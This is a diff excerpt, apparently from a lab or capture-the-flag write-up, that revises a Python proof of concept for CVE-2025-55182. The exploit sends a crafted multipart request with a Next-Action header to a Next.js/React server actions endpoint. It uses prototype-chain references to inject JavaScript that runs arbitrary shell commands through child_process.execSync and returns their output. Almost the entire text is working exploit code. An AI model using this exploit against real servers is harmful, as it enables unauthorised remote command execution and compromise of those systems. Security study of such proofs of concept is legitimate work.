@@ -833,17 +833,10 @@ The PoC published by msanft at https://github.com/msanft/CVE-2025-55182 was sele
 
 ```python
 # poc.py
-import requests, json, re, base64, sys
+import requests, sys, json
 
-BASE_URL = "http://10.129.13.245:3000/"
-CMD = sys.argv[1]
-
-b64_cmd = base64.b64encode(CMD.encode()).decode()
-js_prefix = f"""
-var cmd = Buffer.from('{b64_cmd}', 'base64').toString();
-var res = process.mainModule.require('child_process').execSync(cmd, {{timeout:5000}}).toString().trim();
-throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});
-"""
+BASE_URL = sys.argv[1]
+EXECUTABLE = sys.argv[2]
 
 crafted_chunk = {
     "then": "$1:__proto__:then",
@@ -851,16 +844,19 @@ crafted_chunk = {
     "reason": -1,
     "value": '{"then": "$B0"}',
     "_response": {
-        "_prefix": js_prefix.strip(),
+        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
         "_formData": {"get": "$1:constructor:constructor"},
     },
 }
 
-files = {"0": (None, json.dumps(crafted_chunk)), "1": (None, '"$@0"')}
-headers = {"Next-Action": "x"}
-response = requests.post(BASE_URL, files=files, headers=headers)
+files = {
+    "0": (None, json.dumps(crafted_chunk)),
+    "1": (None, '"$@0"')
+}
 
-print(response.text)
+headers = {"Next-Action": "x"}
+
+requests.post(BASE_URL, files=files, headers=headers)
 ```
 
 ```python
